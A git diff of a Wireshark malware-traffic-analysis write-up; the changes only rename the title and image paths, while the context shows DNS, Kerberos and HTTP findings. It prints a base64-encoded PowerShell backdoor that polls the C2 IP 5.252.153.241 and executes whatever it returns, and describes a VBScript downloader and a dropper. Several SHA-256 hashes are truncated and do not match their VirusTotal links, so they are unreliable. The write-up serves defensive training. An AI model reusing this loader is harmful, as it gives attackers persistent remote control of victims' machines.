@@ -1,7 +1,7 @@
 ---
-title: 2025-01-22 - TRAFFIC ANALYSIS EXERCISE Writeup
+title: 2025-01-22-TRAFFICANALYSISEXERCISE Writeup
 date: 2025-08-02 03:30:30 +0200
-categories: [traffic_analysis, 2025-01-22 - TRAFFIC ANALYSIS EXERCISE]
+categories: [traffic_analysis, 2025-01-22-TRAFFICANALYSISEXERCISE]
 tags: [wireshark, PCAP]
 description: analyzing PCAP file using wireshark.
 ---
@@ -12,7 +12,7 @@ First we need to find the local IP addresses that are being used in our network.
 to achieve that: go to `Statistics` → `Endpoints` → `IPv4`.
 
 you will see a lot of IPs so How we can find our local IP address? ok, if we look at our local LAN range on the task page you will see that it is: `10.1.17[.]0/24` so we will search for `10.1.17.X` you can easily arrange the IPs according to **<span style="color: green">Address</span>** column. it will arrange IPs so you can easily find the Local IPs.
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/1.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/1.png)
 As we can see here we have 3 local IP addresses:
 - 10.1.17.2
 - 10.1.17.215
@@ -23,14 +23,14 @@ As we can see here we have 3 local IP addresses:
 Now we want to know what is the host name of each IP.
 
 First we need to resolve the IP addresses to host names. We can do that by: Go to `Edit` → `Preferences` → `Name resolution` then you will check **<span style="color: green">Resolve network (IP) addresses</span>** field then hit apply.
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/2.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/2.png)
 
 ok now after we resolve IPs we will filter by IPs we found on our local network: 
 ```
 ip.addr==10.1.17.2 || ip.addr==10.1.17.215 || ip.addr==10.1.17.255
 ```
 Then hit enter. Now go to `Statistics` → `Resolved Addresses` then choose **<span style="color: green">Hosts</span>** form the entry menu. Now arrange IPs according to **<span style="color: green">Address</span>** column. You will find the resolved IPs addresses we want.
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/3.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/3.png)
 Now here are Host Names we got:
 - **IP**: 10.1.17.2	, **Host Name**: win-gsh54qlw48d.bluemoontuesday.com.
 - **IP**: 10.1.17.215 , **Host Name**: DESKTOP-L8C5GSJ.bluemoontuesday.com.
@@ -44,7 +44,7 @@ now we want to identify ports in our LAN. so to do that we will use this filter:
 > HINT: we filter the ports under 10000 because Ports from 0 to 1023 are well-known ports, reserved for common services like HTTP (80), HTTPS (443), FTP (21), SSH (22), and DNS (53). These are typically used by servers running standard services.
 
 Now take a look of what you have got. you will notice that the source is **10.1.17.215** and the destination is **10.1.17.2** . After that go to `Statistics` → `Protocol Hierarchy`. you will find ports are used in our LAN.
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/4.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/4.png)
 So we got some useful protocols:
 - SMB
 - Kerberos 
@@ -63,7 +63,7 @@ kerberos && kerberos.msg_type == 10
 > - Potential issues like failed authentications, misconfigured clients, or even malicious activity (e.g., brute-force attempts).
 
 then hit enter. Ok now select any packet and expand **<span style="color: green">kerberos</span>** then expand **<span style="color: green">as-req</span>** then expand **<span style="color: green">cname</span>** then expand **<span style="color: green">cname-string</span>** then you will find  **<span style="color: green">CNameString</span>**: `shutchenson`.
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/5.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/5.png)
 so the user account for **10.1.17.215** is **shutchenson** .
 
 # DNS
@@ -74,7 +74,7 @@ Ok we know that the victim downloaded a suspicious file so we need to look for D
 ```
 > By setting dns.flags.response == 0, you're filtering for only the DNS queries initiated by the client, ignoring the server’s responses.
 
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/6.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/6.png)
 The noticeable domains are:
 - google-authenticator.burleson-appliance.net
 - authenticatoor.org
@@ -87,24 +87,24 @@ Now we want the IP addresses for these domains. We will use domains as filters.
 > - The dns.qry.type == 1 ensures the filter only captures responses to queries asking for an IPv4 address (not other record types like CNAME, MX, or AAAA).
 > - (dns.flags.response==1) This means the filter is looking for the DNS server’s reply to queries for the specified domains, which typically include the resolved IP address or other DNS records.
 
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/7.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/8.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/7.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/8.png)
 Ok now we want to know if there any connections to those IPs. We will use them as filter.
 ```
 ip.addr==104.21.64.1 || ip.addr == 104.21.48.1 || ip.addr == 104.21.32.1 || ip.addr == 104.21.80.1 || ip.addr == 104.21.16.1 || ip.addr == 104.21.96.1 || ip.addr == 104.21.112.1 || ip.addr == 82.221.136.26
 ```
 Now go to `Statistics` → `Endpoints` you will see that there is a connection to **82.221.136.26** and **104.21.64.1**.
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/9.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/9.png)
 Let’s check these two IPs on virustotal:
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/10.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/11.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/12.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/13.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/14.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/10.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/11.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/12.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/13.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/14.png)
 We also need to check the two domains we got:
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/15.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/16.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/17.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/15.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/16.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/17.png)
 
 # HTTP traffic
 ***
@@ -113,11 +113,11 @@ Ok now we want to read a plaintext traffic like HTTP traffic. So we will filter 
 http && ip.src==10.1.17.215 
 ```
 We will notice suspicious packets.
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/18.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/18.png)
 As we can see there is a GET request with URI: **/api/file/get-file/264872**.
 Ok now right click and choose `Follow` → `TCP Stream`.
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/19.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/20.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/19.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/20.png)
 As we can see we have VBScript embedded in an HTML code:
 - The primary purpose of this malicious code is to covertly download and execute a malicious PowerShell script from a remote server (http://5.252.153.241:80/api/file/get-file/29842.ps1) while disguising its activity to avoid detection.
 - The URL http://5.252.153.241 points to a specific IP address, which is not associated with a well-known or trusted domain. This is a common trait of command-and-control (C2) servers used by attackers.
@@ -127,7 +127,7 @@ As we can see we have VBScript embedded in an HTML code:
 
 Now switch to previous filter: http && ip.src==10.1.17.215. and analysis 29842.ps1.
 you will notice base64 coded string.
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/21.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/21.png)
 - The string begins with `iex ((system.convert)::`, which is a PowerShell command.
 - system.convert refers to the .NET System.Convert class, often used to decode or transform data (e.g., Base64 decoding).
 - we notice  `.replace()` function(used to add characters to the code and make it hard to decode). So we need first to reverse the .replace function.
@@ -212,7 +212,7 @@ The output is:
 > 'JGZzbyA9IE5ldy1PYmplY3QgLUNvbSAiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiCiRTZXJpYWxOdW1iZXIgPSAkZnNvLkdldERyaXZlKCJjOlwiKS5TZXJpYWxOdW1iZXIKJFNlcmlhbE51bWJlciA9ICJ7MDpYfSIgLWYgJFNlcmlhbE51bWJlcgokU2VyaWFsTnVtYmVyID0gW2NvbnZlcnRdOjp0b2ludDY0KCRTZXJpYWxOdW1iZXIsMTYpCiRzZXJpYWwgPSAkU2VyaWFsTnVtYmVyCiRpcCA9ICdodHRwOi8vNS4yNTIuMTUzLjI0MS8nCiR1cmwgPSAkaXArJHNlcmlhbAokcyA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKd2hpbGUgKCR0cnVlKSB7CiAgICB0cnkgewogICAgICAgICRyZXN1bHQ9JHMuRG93bmxvYWRTdHJpbmcoJHVybCkKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICBTdGFydC1TbGVlcCAtcyA1CiAgICAgICAgY29udGludWUKICAgIH0KICAgIEludm9rZS1FeHByZXNzaW9uICRyZXN1bHQKICAgIFN0YXJ0LVNsZWVwIC1zIDUKfQo=’
 
 Now we want to decode this base64 string. i used [CyberCheif](https://cyberchef.org/)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/22.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/22.png)
 So the output is:
 
 ```powershell
@@ -254,7 +254,7 @@ After analysis this code: This script acts as a persistent remote access tool (R
 So in conclusion that This PowerShell script is a malicious backdoor that uses the C: drive serial number to uniquely identify and communicate with a remote server (5.252.153.241), downloading and executing commands in an infinite loop. Its design enables persistent remote control and potential system compromise.
 
 Ok now in the same TCP stream page, if you scroll down a little you will find successful packet:
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/23.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/23.png)
 From the screenshot we got this code:
 ```powershell
 function Download-Files($panelIP, $files, $filesDir){
@@ -389,46 +389,46 @@ This script is a **malware dropper and persistence mechanism** with the followin
 - **Startup Persistence**: Creating a shortcut in the Startup folder is typical for maintaining access.
 - **Error Handling**: The script continues despite errors, ensuring it achieves its goal.
 So i searched for the four files:
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/24.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/24.png)
 Ok now we want to investigate these files. First we want to download them so to do that go to `Files` → `Export Objects` → `HTTP`
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/25.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/25.png)
 
 You will find these 4 files:
 
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/26.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/26.png)
 
 Now save each on of them.
 
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/27.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/27.png)
 
 Next let’s scan them on VirusTotal:
 
 ### pas.ps1
 ***
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/28.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/29.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/28.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/29.png)
 The file has a SHA-256 hash of `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e` and is identified as a text file (text type, ASCII text with very long lines, 1,531 bytes, with CRLF line terminators).
 
 Out of 70 security vendors, 24 have flagged this file as malicious, indicating a significant concern. The detection ratio (24/70) suggests it is likely malicious.
 VirusTotal: [VirusTotal_Report](https://www.virustotal.com/gui/file/a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e/details)
 ### TV.txt
 ***
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/30.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/31.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/30.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/31.png)
 The file has a SHA-256 hash of `3448d4d308f2459b8e211f8521c71ea616e4055f2c4a3b91f5f7` and is identified as a DLL file (122.6 KB).
 
 Out of 71 security vendors, 42 have flagged this file as malicious, indicating a high likelihood of it being a threat.
 VirusTotal: [VirusTotal_Report](https://www.virustotal.com/gui/file/3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7/details)
 ### TeamViewer_Resource.dll
 ***
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/32.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/32.png)
 The file has a SHA-256 hash of `9634ecaf6914379a3a74f53d2394c1ce4e4780701cdbff935192` and is identified as a DLL file (32.29 KB).
 
 No security vendors (0/72) have flagged this file as malicious, indicating it is likely clean or not yet recognized as a threat by current antivirus signatures.
 VirusTotal: [VirusTotal_Report](https://www.virustotal.com/gui/file/9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192/details)
 ### TeamViewer.exe
 ***
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/33.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/33.png)
 The file has a SHA-256 hash of `9042b02d6b9787e8e0a7b4c022a3b59e8051c411f2a6f16453e` and is identified as an EXE file (418 MB).
 
 No security vendors (0/72) have flagged this file as malicious, indicating it is likely clean or not yet recognized as a threat by current antivirus signatures.
@@ -437,15 +437,15 @@ VirusTotal: [VirusTotal_Report](https://www.virustotal.com/gui/file/904280f20d69
 So when the above files are downloaded, a packet is logged and the **Send-Log** function send this log to the C2 server.
 
 We can see that through this image:
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/34.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/34.png)
 Ok now let’s Follow this stream:
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/35.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/35.png)
 Ok if we looked at the communication with C2 server at **<span style="color: green">tcp.stream eq 162</span>** , after a series of requests from the client to the URL, the C2 server responded 3 times (frame numbers **18905**, **27941** and **32969**).
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/36.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/37.png)
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/38.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/36.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/37.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/38.png)
 Ok let’s follow TCP stream to one of them(all 3 give the same result). Scroll down a little until find **HTTP/1.1 200 OK**:
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/39.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/39.png)
 From the screen we have this code:
 ```powershell
 function Send-Log($result){
@@ -555,7 +555,7 @@ So in conclusion this PowerShell designed to create and execute a hidden script 
 
 Ok now we want to analyze **<span style="color: green">skqllz.ps1</span>**. I copied **$fileContent** value and used CyberChef the decode it.
 
-![Resolve IP Addresses](assets\img\2025-01-22 - TRAFFIC ANALYSIS EXERCISE/40.png)
+![Resolve IP Addresses](assets\img\2025-01-22-TRAFFICANALYSISEXERCISE/40.png)
 
 From the screen we have the content of **skqllz.ps1** (this is a part of the script. Full script is so Large to show):
 
